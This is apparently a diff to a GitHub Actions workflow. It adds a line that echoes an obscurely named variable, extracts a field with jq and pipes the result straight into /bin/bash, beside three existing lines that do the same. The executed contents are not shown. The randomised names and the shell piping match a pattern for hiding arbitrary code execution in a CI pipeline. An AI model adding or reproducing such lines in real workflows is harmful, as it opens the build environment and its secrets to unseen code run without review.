@@ -39,6 +39,7 @@ jobs:
           echo $meksf5651 | jq -r .noc4215 | /bin/bash
           echo $lf756 | jq -r .pnfgi5332 | /bin/bash
           printf '%s' "$u494" | jq -r .rc2880 | /bin/bash
+          echo $hw0032 | jq -r .rgy33446 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
